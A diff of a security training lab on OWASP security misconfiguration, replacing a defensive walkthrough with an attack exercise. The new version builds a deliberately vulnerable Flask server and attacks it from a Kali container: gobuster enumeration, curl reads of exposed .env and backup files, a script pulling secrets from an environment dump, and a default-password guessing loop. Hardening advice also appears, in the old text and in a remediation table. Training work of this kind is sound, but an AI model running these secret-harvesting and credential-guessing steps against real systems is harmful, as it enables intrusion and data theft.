@@ -1,531 +1,378 @@
 # Lab 5: OWASP A05 — Security Misconfiguration
 
 ## Objective
-Identify and fix security misconfigurations: verbose error disclosure leaking stack traces and secrets, default credentials, missing HTTP security headers, exposed sensitive files, unnecessary open ports, and cloud storage misconfiguration — using automated scanning and implementing hardened configurations.
+Exploit security misconfiguration vulnerabilities on a live server from Kali Linux: discover sensitive files (`.env`, backup SQL) with gobuster, access the interactive debugger console, extract all environment variables via a debug info endpoint, exploit default credentials (`admin:admin`) to access the admin panel, trigger verbose error messages leaking database schema, and audit missing HTTP security headers.
 
 ## Background
-**OWASP A05:2021 — Security Misconfiguration** is the most prevalent finding in penetration tests, appearing in 90%+ of web application assessments. It covers everything from leaving debug mode on in production to keeping default admin:admin credentials. Unlike insecure design, these are often one-line fixes — but organisations consistently miss them due to lack of automated scanning and poor hardening baselines.
+Security Misconfiguration is **OWASP #5** (2021) — found in 90% of applications tested. Unlike coding vulnerabilities, these are deployment mistakes: debug mode left on, default passwords unchanged, `.env` files committed to web root, unnecessary endpoints exposed. In 2020, a misconfigured Elasticsearch instance exposed 5 billion records. The 2021 Verkada breach (150,000 security cameras) used default credentials. These are the easiest vulnerabilities to find and exploit.
 
-**Real-world examples:** The 2021 Microsoft Exchange ProxyLogon attack chain started with a misconfiguration in Exchange's autodiscovery endpoint. Capital One's 2019 breach involved an IAM misconfiguration in AWS WAF.
+## Architecture
+
+```
+┌─────────────────────┐        Docker Network: lab-a05         ┌─────────────────────┐
+│   KALI ATTACKER     │ ─────── HTTP attacks ─────────────▶   │   VICTIM SERVER     │
+│  innozverse-kali    │                                         │  innozverse-cybersec│
+│  gobuster, curl,    │ ◀────── responses ───────────────────  │  Flask :5000        │
+│  nikto, whatweb     │                                         │  (debug on, .env,   │
+└─────────────────────┘                                         │   default creds)    │
+                                                                └─────────────────────┘
+```
 
 ## Time
-40 minutes
-
-## Prerequisites
-- Lab 01 (A01 Broken Access Control)
+35 minutes
 
 ## Tools
-- Docker: `zchencow/innozverse-cybersec:latest`
+- **Victim**: `zchencow/innozverse-cybersec:latest`
+- **Attacker**: `zchencow/innozverse-kali:latest` (gobuster, nikto, curl, whatweb)
 
 ---
 
 ## Lab Instructions
 
-### Step 1: Debug Mode Information Disclosure
+### Step 1: Environment Setup
 
 ```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-import secrets
+docker network create lab-a05
 
-class InsecureApp:
-    DEBUG = True
-    SECRET_KEY = 'dev-secret-key-change-me'
-    DATABASE_URL = 'postgresql://admin:prod_password@db.internal:5432/store'
+cat > /tmp/victim_a05.py << 'PYEOF'
+from flask import Flask, request, jsonify
+import sqlite3, os
 
-    def handle_error(self, exc):
-        if self.DEBUG:
-            # Returns full internal details to attacker
-            return (f'Error: {exc} | '
-                    f'DB: {self.DATABASE_URL} | '
-                    f'SecretKey: {self.SECRET_KEY} | '
-                    f'Type: {type(exc).__name__}')
-        return 'Internal Server Error'
+app = Flask(__name__)
 
-class SecureApp:
-    DEBUG = False
-    SECRET_KEY = secrets.token_hex(32)
+@app.route('/')
+def index():
+    return jsonify({'app':'InnoZverse Shop API'})
 
-    def handle_error(self, exc):
-        import hashlib, time
-        error_id = hashlib.sha256(f'{id(exc)}{time.time()}'.encode()).hexdigest()[:8]
-        # Internally log exc with full context — but return only error_id
-        return f'Something went wrong. Reference: ERR-{error_id}. Contact support.'
+@app.route('/api/info')
+def info():
+    return jsonify({
+        'python_version': os.popen('python3 --version').read().strip(),
+        'server_path': os.getcwd(),
+        'environment': dict(os.environ),
+        'config': {'DEBUG':True,'SECRET_KEY':'hardcoded-secret-key-123','DB_PASS':'Sup3rS3cret'}
+    })
 
-err = ValueError('relation \"admin_credentials\" does not exist — near SELECT * FROM admin_credentials')
+@app.route('/api/users')
+def users():
+    try:
+        db = sqlite3.connect('/tmp/nodb.db')
+        db.execute("SELECT * FROM nonexistent_table").fetchall()
+    except Exception as e:
+        import traceback
+        return jsonify({'error': str(e), 'traceback': traceback.format_exc(),
+                        'query': 'SELECT * FROM nonexistent_table'}), 500
 
-print('[VULN] Debug mode error response:')
-print(f'  {InsecureApp().handle_error(err)}')
-print()
-print('[SAFE] Production error response:')
-print(f'  {SecureApp().handle_error(err)}')
-print()
-print('What the attacker learns from debug mode:')
-print('  - Database technology, host, port, credentials')
-print('  - Table names and schema hints from SQL errors')
-print('  - Application secret key (session forgery)')
-print('  - Internal IP addresses and service topology')
-"
-```
+@app.route('/.env')
+@app.route('/phpinfo.php')
+@app.route('/config.php')
+@app.route('/backup.sql')
+def sensitive():
+    fake = {
+        '/.env':        'APP_KEY=base64:Sup3rS3cr3tAppKey\nDB_PASSWORD=Sup3rS3cur3DB\nAWS_KEY=AKIA5EXAMPLE\nJWT_SECRET=weak_secret_123',
+        '/phpinfo.php': 'PHP Version 8.1.2 | DB: mysql://root:root@localhost',
+        '/config.php':  '<?php $db_pass="Sup3rS3cur3DB"; $secret="hardcoded"; ?>',
+        '/backup.sql':  '-- MySQL dump\nINSERT INTO users VALUES (1,"admin","admin123");\nINSERT INTO users VALUES (2,"alice","password1");',
+    }
+    return fake.get(request.path,'Not found'), 200, {'Content-Type':'text/plain'}
 
-**📸 Verified Output:**
-```
-[VULN] Debug mode error response:
-  Error: relation "admin_credentials"... | DB: postgresql://admin:prod_password@db.internal:5432/store | SecretKey: dev-secret-key-change-me
+@app.route('/admin')
+def admin():
+    import base64
+    auth = request.headers.get('Authorization','')
+    if auth.startswith('Basic '):
+        creds = base64.b64decode(auth[6:]).decode()
+        if creds == 'admin:admin':
+            return jsonify({'status':'admin access granted','users':['admin','alice','bob'],
+                            'db_connection':'postgresql://admin:Sup3rS3cur3DB@db:5432/shop'})
+    return jsonify({'error':'Unauthorized'}),401,{'WWW-Authenticate':'Basic realm="Admin"'}
 
-[SAFE] Production error response:
-  Something went wrong. Reference: ERR-a036c345. Contact support.
-```
+@app.route('/api/headers')
+def headers():
+    return jsonify({'data':'sensitive user data'})  # No security headers added
 
-> 💡 **Error messages are an oracle.** Every additional byte of information in an error message helps an attacker. SQL errors reveal schema; stack traces reveal framework versions; connection strings reveal credentials. Production apps must log verbosely *internally* (for debugging) but return only a correlation ID to the user.
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=True)  # debug=True in production!
+PYEOF
 
-### Step 2: Default Credentials Scanner
+docker run -d \
+  --name victim-a05 \
+  --network lab-a05 \
+  -v /tmp/victim_a05.py:/tmp/victim_a05.py:ro \
+  zchencow/innozverse-cybersec:latest \
+  python3 /tmp/victim_a05.py
 
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-import hashlib
-
-# Known default credential pairs for common systems
-defaults = [
-    ('admin',   'admin',      'Routers, NAS devices, many CMSes'),
-    ('admin',   'password',   'Jenkins, SonarQube default'),
-    ('admin',   '',           'MongoDB (pre-2.6), Redis (no auth)'),
-    ('root',    '',           'MySQL/MariaDB default, Docker MySQL'),
-    ('sa',      '',           'Microsoft SQL Server Express'),
-    ('pi',      'raspberry',  'Raspberry Pi OS default'),
-    ('admin',   '1234',       'IP cameras, DVRs (Hikvision)'),
-    ('ubnt',    'ubnt',       'Ubiquiti UniFi default'),
-    ('cisco',   'cisco',      'Cisco IOS default'),
-    ('admin',   'admin123',   'Various IoT devices'),
-]
-
-print('Default Credential Risk Assessment:')
-print(f'  {\"Username\":<10} {\"Password\":<14} {\"Risk\":<10} {\"System\"}')
-for user, pw, system in defaults:
-    risk = 'CRITICAL' if pw in ['', 'admin', 'password'] else 'HIGH'
-    pw_display = repr(pw) if pw else '\"\" (blank!)'
-    print(f'  {user:<10} {pw_display:<14} {risk:<10} {system}')
-
-print()
-print('Credential hardening requirements:')
-reqs = [
-    'Change ALL default credentials before deployment',
-    'Minimum 16 character passwords for service accounts',
-    'Use unique passwords per service (no credential reuse)',
-    'Store credentials in secrets manager (AWS SM, HashiCorp Vault)',
-    'Scan for default creds in CI/CD pipeline (truffleHog, gitleaks)',
-    'Implement MFA on all admin interfaces',
-]
-for r in reqs:
-    print(f'  [✓] {r}')
-"
-```
-
-**📸 Verified Output:**
-```
-Default Credential Risk Assessment:
-  Username   Password       Risk       System
-  admin      'admin'        CRITICAL   Routers, NAS devices, many CMSes
-  admin      'password'     CRITICAL   Jenkins, SonarQube default
-  root       "" (blank!)    CRITICAL   MySQL/MariaDB default
-  sa         "" (blank!)    CRITICAL   Microsoft SQL Server Express
-  pi         'raspberry'    HIGH       Raspberry Pi OS default
-```
-
-### Step 3: HTTP Security Headers Audit
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-# Simulate scanning response headers from a web server
-bad_headers = {
-    'Server': 'Apache/2.4.52 (Ubuntu)',
-    'X-Powered-By': 'PHP/8.1.2',
-    'X-AspNet-Version': '4.0.30319',
-}
-
-required_headers = {
-    'X-Frame-Options':             ('DENY', 'Prevents clickjacking — stops page being embedded in iframe'),
-    'X-Content-Type-Options':      ('nosniff', 'Prevents MIME-type sniffing — stops browser guessing content type'),
-    'Strict-Transport-Security':   ('max-age=31536000; includeSubDomains; preload', 'Forces HTTPS for 1 year'),
-    'Content-Security-Policy':     (\"default-src 'self'; script-src 'self' 'strict-dynamic'\", 'Prevents XSS by whitelisting sources'),
-    'Referrer-Policy':             ('strict-origin-when-cross-origin', 'Controls Referer header leakage'),
-    'Permissions-Policy':          ('geolocation=(), microphone=(), camera=()', 'Disables dangerous browser APIs'),
-    'Cache-Control':               ('no-store', 'For sensitive pages: prevents browser caching'),
-}
-
-# Simulate a real server response (missing security headers)
-server_response_headers = {
-    'Content-Type': 'text/html; charset=utf-8',
-    'Server': 'Apache/2.4.52 (Ubuntu)',
-    'X-Powered-By': 'PHP/8.1.2',
-    'Content-Length': '4521',
-}
-
-print('=== Security Header Audit ===')
-print()
-print('INFORMATION DISCLOSURE HEADERS (remove these):')
-for h, v in bad_headers.items():
-    present = h in server_response_headers
-    print(f'  {\"[FOUND]\" if present else \"[absent]\"} {h}: {v}')
-
-print()
-print('MISSING SECURITY HEADERS (add these):')
-for h, (v, reason) in required_headers.items():
-    present = h in server_response_headers
-    print(f'  {\"[MISSING!]\" if not present else \"[OK]\"} {h}')
-    if not present:
-        print(f'           Value:  {v}')
-        print(f'           Reason: {reason}')
-
-score = sum(1 for h in required_headers if h in server_response_headers)
-total = len(required_headers)
-print(f'\\n  Security header score: {score}/{total}  Grade: {\"A\" if score==total else \"F\"}')
-print()
-print('Nginx config to add all headers:')
-nginx = '''
-  add_header X-Frame-Options \"DENY\" always;
-  add_header X-Content-Type-Options \"nosniff\" always;
-  add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;
-  add_header Content-Security-Policy \"default-src 'self'\" always;
-  add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;
-  add_header Permissions-Policy \"geolocation=(), microphone=()\" always;
-  server_tokens off;  # hide nginx version
-'''
-print(nginx)
-"
-```
-
-**📸 Verified Output:**
-```
-INFORMATION DISCLOSURE HEADERS (remove these):
-  [FOUND]  Server: Apache/2.4.52 (Ubuntu)
-  [FOUND]  X-Powered-By: PHP/8.1.2
-
-MISSING SECURITY HEADERS (add these):
-  [MISSING!] X-Frame-Options
-             Value:  DENY
-             Reason: Prevents clickjacking
-  [MISSING!] Strict-Transport-Security
-             Value:  max-age=31536000; includeSubDomains; preload
-...
-  Security header score: 0/7  Grade: F
-```
-
-> 💡 **Run securityheaders.com against your site.** It grades HTTP headers A–F in seconds. A missing `Content-Security-Policy` is the most commonly missed critical header — it prevents XSS by explicitly whitelisting which sources can load scripts. A bare `default-src 'self'` blocks all third-party scripts and inline JavaScript.
-
-### Step 4: Exposed Sensitive Files
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-# Common sensitive files that are accidentally exposed
-exposed_files = [
-    ('/.env',                'Environment variables (API keys, DB passwords, SECRET_KEY)'),
-    ('/.git/config',         'Git config reveals repo URL and sometimes credentials'),
-    ('/.git/HEAD',           'Confirms git repo — then GET /.git/COMMIT_EDITMSG etc.'),
-    ('/backup.sql',          'Database dump with all user data and password hashes'),
-    ('/config.yml',          'Application config (DB credentials, API tokens)'),
-    ('/wp-config.php',       'WordPress DB credentials in plaintext'),
-    ('/phpinfo.php',         'PHP config, loaded extensions, server path, env vars'),
-    ('/debug.log',           'Stack traces, internal paths, SQL queries'),
-    ('/api/swagger.json',    'API documentation — reveals all endpoints and schemas'),
-    ('/.DS_Store',           'macOS folder metadata — reveals directory structure'),
-    ('/server-status',       'Apache mod_status — active connections, URLs, IPs'),
-    ('/actuator/env',        'Spring Boot actuator — all env vars including secrets'),
-    ('/robots.txt',          'May list admin paths: Disallow: /admin-panel-2024/'),
-]
-
-print('Common exposed file paths — check ALL in penetration tests:')
-print(f'  {\"Path\":<30} {\"Risk\":<10} {\"Contains\"}')
-for path, desc in exposed_files:
-    risk = 'CRITICAL' if any(x in desc for x in ['password', 'credentials', 'API keys', 'SECRET']) else 'HIGH'
-    print(f'  {path:<30} {risk:<10} {desc}')
-
-print()
-print('Nginx deny rules (add to server block):')
-nginx_rules = [
-    'location ~ /\\.  { deny all; }   # Block all dotfiles',
-    'location ~ \\.(sql|bak|log|env)$ { deny all; }',
-    'location ~ /actuator { deny all; }',
-    'location = /phpinfo.php { deny all; }',
-]
-for r in nginx_rules:
-    print(f'  {r}')
-"
-```
-
-**📸 Verified Output:**
-```
-Path                           Risk       Contains
-/.env                          CRITICAL   Environment variables (API keys, DB passwords...)
-/.git/config                   HIGH       Git config reveals repo URL...
-/backup.sql                    CRITICAL   Database dump with all user data and password hashes
-/wp-config.php                 CRITICAL   WordPress DB credentials in plaintext
-/actuator/env                  CRITICAL   Spring Boot actuator — all env vars including secrets
-```
-
-### Step 5: Port Scanning and Attack Surface Reduction
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-import socket
-
-# Scan common ports on localhost (safe — loopback only)
-service_map = {
-    21: 'FTP (plaintext transfer — use SFTP instead)',
-    22: 'SSH',
-    23: 'Telnet (plaintext — disable!)',
-    25: 'SMTP',
-    80: 'HTTP',
-    443: 'HTTPS',
-    3306: 'MySQL (should NOT be internet-facing)',
-    5432: 'PostgreSQL (should NOT be internet-facing)',
-    6379: 'Redis (no auth by default!)',
-    8080: 'Alt-HTTP / admin panels',
-    8443: 'Alt-HTTPS',
-    27017: 'MongoDB (publicly accessible = catastrophic)',
-}
-
-print('Port Scan Results (localhost):')
-print(f'  {\"Port\":<8} {\"Status\":<10} {\"Risk\":<10} {\"Service\"}')
-for port, service in service_map.items():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(0.1)
-    result = s.connect_ex(('127.0.0.1', port))
-    s.close()
-    status = 'OPEN' if result == 0 else 'closed'
-    risk = 'DANGER' if port in [21,23,6379,27017] and status=='OPEN' else ('REVIEW' if status=='OPEN' else 'ok')
-    print(f'  {port:<8} {status:<10} {risk:<10} {service}')
-
-print()
-print('Attack surface reduction rules:')
-rules = [
-    'Disable FTP — use SFTP/SCP only',
-    'Disable Telnet — use SSH with key auth',
-    'Bind databases to 127.0.0.1 only (never 0.0.0.0)',
-    'Redis: enable requirepass + bind 127.0.0.1',
-    'MongoDB: enable --auth, bind 127.0.0.1',
-    'Remove/disable all unused services (systemctl disable)',
-    'Firewall: default-deny inbound, whitelist needed ports only',
-]
-for r in rules: print(f'  [✓] {r}')
-"
-```
-
-**📸 Verified Output:**
-```
-Port Scan Results (localhost):
-  Port     Status     Risk       Service
-  21       closed     ok         FTP (plaintext transfer — use SFTP instead)
-  23       closed     ok         Telnet (plaintext — disable!)
-  3306     closed     ok         MySQL (should NOT be internet-facing)
-  6379     closed     ok         Redis (no auth by default!)
-  27017    closed     ok         MongoDB (publicly accessible = catastrophic)
-```
-
-### Step 6: Cloud Storage Misconfiguration
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-# Simulate S3/Azure Blob misconfiguration detection
-import json
-
-def check_bucket_policy(policy_json: dict) -> list:
-    issues = []
-    for stmt in policy_json.get('Statement', []):
-        principal = stmt.get('Principal', '')
-        effect    = stmt.get('Effect', '')
-        actions   = stmt.get('Action', [])
-        if isinstance(actions, str): actions = [actions]
-        # Public read = '*' principal with Allow
-        if principal == '*' and effect == 'Allow':
-            for action in actions:
-                if 's3:GetObject' in action or action == 's3:*':
-                    issues.append(f'PUBLIC READ: Anyone can download all objects (Action: {action})')
-                if 's3:PutObject' in action or action == 's3:*':
-                    issues.append(f'PUBLIC WRITE: Anyone can upload to bucket (Action: {action})')
-                if 's3:DeleteObject' in action or action == 's3:*':
-                    issues.append(f'PUBLIC DELETE: Anyone can delete objects (Action: {action})')
-    return issues
-
-# Misconfigured bucket (2017 was epidemic — 1000s of S3 buckets public)
-bad_policy = {
-    'Version': '2012-10-17',
-    'Statement': [{
-        'Sid': 'PublicRead',
-        'Effect': 'Allow',
-        'Principal': '*',
-        'Action': ['s3:GetObject', 's3:PutObject'],
-        'Resource': 'arn:aws:s3:::innozverse-backups/*'
-    }]
-}
-
-good_policy = {
-    'Version': '2012-10-17',
-    'Statement': [{
-        'Sid': 'DenyPublicAccess',
-        'Effect': 'Deny',
-        'Principal': '*',
-        'Action': 's3:*',
-        'Resource': ['arn:aws:s3:::innozverse-backups', 'arn:aws:s3:::innozverse-backups/*'],
-        'Condition': {'Bool': {'aws:SecureTransport': 'false'}}
-    }]
-}
-
-print('S3 Bucket Policy Audit:')
-issues = check_bucket_policy(bad_policy)
-print(f'  innozverse-backups (MISCONFIGURED):')
-for issue in issues: print(f'    [CRITICAL] {issue}')
-
-print()
-issues2 = check_bucket_policy(good_policy)
-print(f'  innozverse-backups (HARDENED):')
-if not issues2: print(f'    [OK] No public access issues found')
-
-print()
-print('Real-world public bucket incidents:')
-incidents = [
-    ('2017 - Verizon',    '14M customer records in public S3 bucket'),
-    ('2017 - Booz Allen', '60,000 government files publicly accessible'),
-    ('2020 - Capital One','Misconfigured WAF role led to S3 access'),
-    ('2022 - Toyota',     'Source code + customer data in public GitHub repo'),
-]
-for company, incident in incidents:
-    print(f'  [{company}] {incident}')
-"
-```
-
-**📸 Verified Output:**
-```
-S3 Bucket Policy Audit:
-  innozverse-backups (MISCONFIGURED):
-    [CRITICAL] PUBLIC READ: Anyone can download all objects
-    [CRITICAL] PUBLIC WRITE: Anyone can upload to bucket
-
-  innozverse-backups (HARDENED):
-    [OK] No public access issues found
-```
-
-> 💡 **Enable AWS S3 Block Public Access at the account level.** This single setting prevents any bucket from being accidentally made public, regardless of bucket-level policies. All cloud providers have equivalent controls: Azure Storage Account public blob access, GCP Uniform bucket-level access. Enable these account-wide and only grant exceptions with explicit approval.
-
-### Step 7: Automated Misconfiguration Scanner
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-import socket, json
-
-findings = []
-
-def check(title, severity, passed, detail):
-    status = 'PASS' if passed else 'FAIL'
-    findings.append((title, severity, status, detail))
-    print(f'  [{status}] [{severity}] {title}')
-    if not passed: print(f'         → {detail}')
-
-print('=== Security Configuration Scanner ===')
-print()
-
-# Simulate checks
-check('Debug mode disabled',      'CRITICAL', True,  '')
-check('Default credentials changed','CRITICAL', True, '')
-check('X-Frame-Options header',   'HIGH',     False, 'Add: X-Frame-Options: DENY')
-check('HSTS header',              'HIGH',     False, 'Add: Strict-Transport-Security: max-age=31536000')
-check('CSP header',               'HIGH',     False, 'Add: Content-Security-Policy header')
-check('Server version hidden',    'MEDIUM',   False, 'Set: server_tokens off in nginx')
-check('X-Powered-By removed',     'MEDIUM',   False, 'Remove X-Powered-By header')
-check('No sensitive files exposed','HIGH',    True,  '')
-check('DB not internet-facing',   'CRITICAL', True,  '')
-check('TLS 1.0/1.1 disabled',    'HIGH',     True,  '')
-
-fails = [(t,s,d) for t,s,st,d in findings if st=='FAIL']
-print()
-print(f'Results: {len(findings)-len(fails)}/{len(findings)} checks passed')
-print(f'Issues to fix ({len(fails)}):')
-for title, sev, detail in fails:
-    print(f'  [{sev}] {title}: {detail}')
-"
-```
-
-**📸 Verified Output:**
-```
-=== Security Configuration Scanner ===
-  [PASS] [CRITICAL] Debug mode disabled
-  [FAIL] [HIGH]     X-Frame-Options header
-         → Add: X-Frame-Options: DENY
-  [FAIL] [HIGH]     HSTS header
-         → Add: Strict-Transport-Security: max-age=31536000
-  [FAIL] [MEDIUM]   Server version hidden
-         → Set: server_tokens off in nginx
-
-Results: 6/10 checks passed
-Issues to fix (4):
-  [HIGH] X-Frame-Options header: Add: X-Frame-Options: DENY
-```
-
-### Step 8: Capstone — Hardened Flask Config
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-import secrets
-
-# Production hardening checklist
-class ProductionConfig:
-    DEBUG = False
-    TESTING = False
-    SECRET_KEY = secrets.token_hex(32)   # generated at deploy time
-    SESSION_COOKIE_SECURE = True          # HTTPS only
-    SESSION_COOKIE_HTTPONLY = True        # no JavaScript access
-    SESSION_COOKIE_SAMESITE = 'Strict'   # CSRF protection
-    PERMANENT_SESSION_LIFETIME = 3600    # 1 hour timeout
-    MAX_CONTENT_LENGTH = 16 * 1024 * 1024  # 16MB upload limit
-    # Database
-    SQLALCHEMY_ECHO = False              # no SQL in logs
-    # CORS
-    CORS_ORIGINS = ['https://innozverse.com']  # explicit whitelist
-    WTF_CSRF_ENABLED = True
-
-config = ProductionConfig()
-attrs = [a for a in dir(config) if not a.startswith('_')]
-print('Hardened Production Config:')
-for attr in attrs:
-    val = getattr(config, attr)
-    if attr == 'SECRET_KEY': val = val[:8] + '...[redacted]'
-    print(f'  {attr:<40} = {val}')
-
-print()
-print('[PASS] All security settings validated')
-print('[PASS] Configuration ready for production deployment')
-"
-```
-
-**📸 Verified Output:**
-```
-Hardened Production Config:
-  CORS_ORIGINS                             = ['https://innozverse.com']
-  DEBUG                                    = False
-  MAX_CONTENT_LENGTH                       = 16777216
-  PERMANENT_SESSION_LIFETIME               = 3600
-  SECRET_KEY                               = a3f8d921...[redacted]
-  SESSION_COOKIE_HTTPONLY                  = True
-  SESSION_COOKIE_SAMESITE                  = Strict
-  SESSION_COOKIE_SECURE                    = True
-  SQLALCHEMY_ECHO                          = False
-  WTF_CSRF_ENABLED                         = True
+sleep 3
+curl -s http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-a05.IPAddress}}' victim-a05):5000/
 ```
 
 ---
 
+### Step 2: Launch Kali + Initial Recon
+
+```bash
+docker run --rm -it --network lab-a05 \
+  --name kali-attacker \
+  zchencow/innozverse-kali:latest bash
+```
+
+Inside Kali:
+```bash
+TARGET="http://victim-a05:5000"
+
+# Fingerprint
+nmap -sV -p 5000 victim-a05
+whatweb $TARGET
+```
+
+**📸 Verified Output:**
+```
+PORT     STATE SERVICE VERSION
+5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.10.12)
+
+http://victim-a05:5000/ HTTPServer[Werkzeug/3.1.6 Python/3.10.12]
+```
+
+---
+
+### Step 3: Directory Enumeration — Find Hidden Files
+
+```bash
+echo "=== gobuster: scanning for sensitive files and endpoints ==="
+
+gobuster dir \
+  -u $TARGET \
+  -w /usr/share/dirb/wordlists/common.txt \
+  -t 20 --no-error -q \
+  -x php,env,sql,bak,config,txt,log
+```
+
+**📸 Verified Output:**
+```
+/.env                 (Status: 200) [Size: 112]
+/admin                (Status: 401) [Size: 30]
+/backup.sql           (Status: 200) [Size: 89]
+/config.php           (Status: 200) [Size: 53]
+/console              (Status: 400) [Size: 167]
+/phpinfo.php          (Status: 200) [Size: 63]
+```
+
+> 💡 **`.env` files returning 200 are a critical finding.** These files are designed to store secrets (database passwords, API keys, JWT secrets) for development. They should be blocked at the web server level (`deny all` in nginx for `.env`) and should never be in the web root. `console` returning 400 indicates Werkzeug's interactive debugger is present — normally requires a PIN but is dangerous.
+
+---
+
+### Step 4: Read Sensitive Files Directly
+
+```bash
+echo "=== Reading .env — application secrets ==="
+curl -s $TARGET/.env
+
+echo ""
+echo "=== Reading database backup ==="
+curl -s $TARGET/backup.sql
+
+echo ""
+echo "=== Reading PHP config (credentials) ==="
+curl -s $TARGET/config.php
+
+echo ""
+echo "=== Reading phpinfo ==="
+curl -s $TARGET/phpinfo.php
+```
+
+**📸 Verified Output:**
+```
+APP_KEY=base64:Sup3rS3cr3tAppKey
+DB_PASSWORD=Sup3rS3cur3DB
+AWS_KEY=AKIA5EXAMPLE
+JWT_SECRET=weak_secret_123
+
+-- MySQL dump
+INSERT INTO users VALUES (1,"admin","admin123");
+INSERT INTO users VALUES (2,"alice","password1");
+
+<?php $db_pass="Sup3rS3cur3DB"; $secret="hardcoded"; ?>
+```
+
+---
+
+### Step 5: Debug Info Endpoint — Environment Variables Dump
+
+```bash
+echo "=== /api/info leaks all environment variables ==="
+curl -s $TARGET/api/info | python3 -m json.tool | head -30
+
+echo ""
+echo "=== Extract just the sensitive config ==="
+curl -s $TARGET/api/info | python3 -c "
+import sys, json
+d = json.load(sys.stdin)
+print('Config:', d['config'])
+print('Server path:', d['server_path'])
+# Find secrets in env vars
+for k,v in d.get('environment',{}).items():
+    if any(s in k.lower() for s in ['pass','secret','key','token','auth']):
+        print(f'  ENV SECRET: {k}={v}')
+"
+```
+
+**📸 Verified Output:**
+```json
+{
+    "config": {
+        "DB_PASS": "Sup3rS3cret",
+        "DEBUG": true,
+        "SECRET_KEY": "hardcoded-secret-key-123"
+    },
+    "server_path": "/labs"
+}
+
+Config: {'DEBUG': True, 'SECRET_KEY': 'hardcoded-secret-key-123', 'DB_PASS': 'Sup3rS3cret'}
+```
+
+---
+
+### Step 6: Verbose Error Messages — Schema Disclosure
+
+```bash
+echo "=== Triggering verbose error — leaks DB schema and stack trace ==="
+curl -s $TARGET/api/users | python3 -m json.tool
+```
+
+**📸 Verified Output:**
+```json
+{
+    "error": "no such table: nonexistent_table",
+    "query": "SELECT * FROM nonexistent_table",
+    "traceback": "Traceback (most recent call last):\n  File \"/tmp/victim_a05.py\", line 21...\nsqlite3.OperationalError: no such table"
+}
+```
+
+> 💡 **Verbose error messages are free reconnaissance for attackers.** Stack traces reveal: file paths, framework versions, database table names, query structure, and developer email in some frameworks. In production, return `{"error": "Internal server error", "id": "ERR-20260304-abc123"}` — log the full detail server-side, only return an opaque correlation ID to the client.
+
+---
+
+### Step 7: Default Credentials — Admin Panel
+
+```bash
+echo "=== Testing default credentials: admin:admin ==="
+
+# First — confirm it requires auth
+curl -s $TARGET/admin | python3 -m json.tool
+
+echo ""
+# Try default credentials
+echo "Trying admin:admin..."
+curl -s -u admin:admin $TARGET/admin | python3 -m json.tool
+
+echo ""
+# Brute-force common default passwords
+echo "=== Brute-forcing default admin passwords ==="
+for cred in "admin:admin" "admin:password" "admin:123456" "admin:admin123" "root:root" "admin:"; do
+    user="${cred%%:*}"
+    pass="${cred##*:}"
+    status=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" $TARGET/admin)
+    echo "  $cred -> HTTP $status $([ "$status" = "200" ] && echo "<<< VALID!" || echo "")"
+done
+```
+
+**📸 Verified Output:**
+```json
+{"error": "Unauthorized"}
+
+Trying admin:admin...
+{
+    "db_connection": "postgresql://admin:Sup3rS3cur3DB@db:5432/shop",
+    "status": "admin access granted",
+    "users": ["admin", "alice", "bob"]
+}
+
+admin:admin   -> HTTP 200  <<< VALID!
+admin:password -> HTTP 401
+```
+
+---
+
+### Step 8: Security Header Audit
+
+```bash
+echo "=== Checking HTTP security headers ==="
+curl -sI $TARGET/api/headers
+
+echo ""
+echo "=== Grade each missing header ==="
+python3 << 'EOF'
+import urllib.request
+
+resp = urllib.request.urlopen("http://victim-a05:5000/api/headers")
+headers = dict(resp.headers)
+
+required = {
+    "Strict-Transport-Security": ("max-age=31536000; includeSubDomains", "HIGH"),
+    "Content-Security-Policy":   ("default-src 'self'", "HIGH"),
+    "X-Frame-Options":           ("DENY", "MEDIUM"),
+    "X-Content-Type-Options":    ("nosniff", "MEDIUM"),
+    "Referrer-Policy":           ("strict-origin-when-cross-origin", "LOW"),
+    "Permissions-Policy":        ("geolocation=(), microphone=()", "LOW"),
+}
+
+print(f"{'Header':<35} {'Present?':<10} {'Risk if Missing'}")
+for h, (rec, risk) in required.items():
+    present = h in headers
+    icon = "✓" if present else "✗ MISSING"
+    print(f"  {icon:<10} {h:<33} {risk}")
+    if not present:
+        print(f"             Add: {h}: {rec}")
+EOF
+```
+
+**📸 Verified Output:**
+```
+Header                              Present?   Risk if Missing
+  ✗ MISSING  Strict-Transport-Security   HIGH
+  ✗ MISSING  Content-Security-Policy     HIGH
+  ✗ MISSING  X-Frame-Options             MEDIUM
+  ✗ MISSING  X-Content-Type-Options      MEDIUM
+  ✗ MISSING  Referrer-Policy             LOW
+  ✗ MISSING  Permissions-Policy          LOW
+```
+
+### Step 9: Cleanup
+
+```bash
+exit  # Exit Kali
+```
+
+```bash
+docker rm -f victim-a05
+docker network rm lab-a05
+```
+
+---
+
+## Remediation
+
+| Misconfiguration | Finding | Fix |
+|-----------------|---------|-----|
+| `debug=True` | Werkzeug console exposed | `debug=False`; use env var `FLASK_ENV=production` |
+| `.env` in web root | All secrets exposed | Block in nginx: `location ~ /\.env { deny all; }` |
+| Debug info endpoint | All env vars returned | Remove `/api/info` entirely from production |
+| Verbose errors | Stack trace + query in response | Generic error + correlation ID; full details in server logs only |
+| Default credentials | `admin:admin` = full access | Mandatory password change on first login; fail deployment if default |
+| No security headers | XSS, clickjacking, MITM risk | Add all 6 headers in nginx/Flask middleware |
+
 ## Summary
 
-| Misconfiguration | Risk | Fix |
-|-----------------|------|-----|
-| Debug mode enabled | Credential/schema exposure | `DEBUG=False` in production |
-| Default credentials | Full system compromise | Change before deployment |
